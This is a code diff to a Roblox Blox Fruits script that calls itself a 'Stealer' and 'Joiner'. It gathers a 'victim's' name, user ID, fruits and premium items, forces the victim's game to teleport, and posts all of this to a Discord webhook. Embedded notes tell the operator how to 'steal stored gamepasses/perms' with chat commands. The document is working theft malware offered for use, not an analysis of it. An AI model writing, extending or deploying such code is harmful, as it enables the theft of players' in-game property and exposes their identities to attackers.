@@ -580,30 +580,106 @@ local function formatPremiumItems()
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
 end
 
-local embed = {
-    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
-    description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
-    color = hasDragonFruit and 0xFF0000 or 0x00FF00,
-    fields = {
-        {name = "Victim Name", value = PlayerName, inline = true},
-        {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
-        {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
-        {name = "Premium Items", value = formatPremiumItems(), inline = false},
-        {name = "Sea", value = Sea, inline = true},
-        {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
-        {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
-        {name = "Join Server (PC COPY)", value = "```lua\n" .. JoinScript .. "\n```", inline = false},
-        {name = "Join Server (Mobile COPY)", value = JoinScript, inline = false},
-        {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
-        {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
-        {name = "NOTES:", value = [[
+-- Define necessary services and variables
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+-- Dynamic message generation based on PlaceId
+local function getMessageForPlaceId(placeId)
+    return (placeId == 4442272183 and "derrosa") or (placeId == 7449423635 and "zou") or "default_message"
+end
+
+-- Embed generation logic
+local function generateEmbed(hasDragonFruit, PlayerName, PlayerUserId, FruitsFormatted, formatPremiumItems, Sea, JoinScript, Sea2Script, Sea3Script, ExecutorName, GameVersion, PlayerCount, ServerTime, JobId)
+    return {
+        title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
+        description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
+        color = hasDragonFruit and 0xFF0000 or 0x00FF00,
+        fields = {
+            {name = "Victim Name", value = PlayerName, inline = true},
+            {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
+            {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
+            {name = "Premium Items", value = formatPremiumItems(), inline = false},
+            {name = "Sea", value = Sea, inline = true},
+            {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
+            {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\nJob ID: %s\n```", PlayerCount, ServerTime, JobId), inline = false},
+            {name = "Join Server (PC COPY)", value = "```lua\n" .. JoinScript .. "\n```", inline = false},
+            {name = "Join Server (Mobile COPY)", value = JoinScript, inline = false},
+            {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
+            {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
+            {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
 2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
 3. If victim Isn't on the server, it means he left.
 ]], inline = false}
+        }
     }
-}
+end
 
+-- Combined Join Sea and Join Server functionality
+local function handleTeleportLogic()
+    local messageToInvoke = getMessageForPlaceId(game.PlaceId)
+
+    if game.PlaceId ~= 4442272183 and game.PlaceId ~= 7449423635 then
+        -- Queue teleport for other PlaceIds
+        queue_onteleport(string.format([[
+            task.wait(5)
+            if game.JobId ~= "%s" then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+            end
+        ]], game.JobId, game.PlaceId, game.JobId))
+
+        -- Invoke the server with the generated message
+        game:GetService("ReplicatedStorage").Remotes.CommF:InvokeServer(messageToInvoke)
+    else
+        -- Direct teleport for valid PlaceIds
+        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+    end
+end
+
+-- Execute teleport logic
+handleTeleportLogic()
+
+-- Webhook logic and additional functionality
+local function sendWebhook(embed)
+    local webhookUrl = "YOUR_WEBHOOK_URL_HERE" -- Replace with your actual webhook URL
+    local payload = HttpService:JSONEncode({
+        content = "@everyone",
+        embeds = {embed}
+    })
+
+    local success, errorMessage = pcall(function()
+        HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        warn("Failed to send webhook: " .. errorMessage)
+    end
+end
+
+-- Example usage (Replace with actual values where necessary)
+local exampleEmbed = generateEmbed(
+    true, -- hasDragonFruit
+    "ExamplePlayer", -- PlayerName
+    123456789, -- PlayerUserId
+    {"Dragon (x1)", "Phoenix (x2)"}, -- FruitsFormatted
+    function() return "Premium Item (x1)" end, -- formatPremiumItems
+    "Sea 2", -- Sea
+    "JoinScriptExample", -- JoinScript
+    "Sea2ScriptExample", -- Sea2Script
+    "Sea3ScriptExample", -- Sea3Script
+    "Synapse", -- ExecutorName
+    "1.4.0", -- GameVersion
+    10, -- PlayerCount
+    "2025-05-02 18:15:42", -- ServerTime
+    "ABCD1234" -- JobId
+)
+
+-- Send example webhook
+sendWebhook(exampleEmbed)
 local isMobile = game:GetService("UserInputService").TouchEnabled
 
 local webhookCache = {
